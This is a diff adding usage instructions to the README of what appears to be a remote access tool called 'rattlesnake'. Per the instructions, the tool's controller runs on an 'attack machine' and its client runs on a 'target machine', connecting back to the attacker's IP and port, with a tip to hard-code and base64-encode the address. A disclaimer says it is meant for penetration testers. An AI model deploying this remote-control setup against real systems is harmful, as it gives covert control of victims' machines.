@@ -26,6 +26,19 @@ File download
 * termcolor (For controller)
 ``` pip3 install termcolor ```
 
+### Usage:  
+Attack machine:  
+```
+python3 controller.py
+> Option 1
+> Enter listener port
+```
+Target machine:
+```
+python3 rattlesnake.py (attack ip) (attack port)
+```
+Alternatively, you can hard code the IP and port (See rattlesnake.py) and base64 encode it (See calc.py and b64example.py)  
+
 ## DISCLAIMER: THIS TOOL WAS CREATED FOR PENETRATION TESTERS, MALWARE ANALYSISTS AND CYBER SEC PROFESSIONALS. THIS TOOL IS ***NOT*** DESIGNED FOR MALICIOUS PURPOSES.  
 ### The creator is ***not*** responsible for any misuses  
 Note: This tool has only been tested on Debian and Ubuntu(20.04 LTS) 
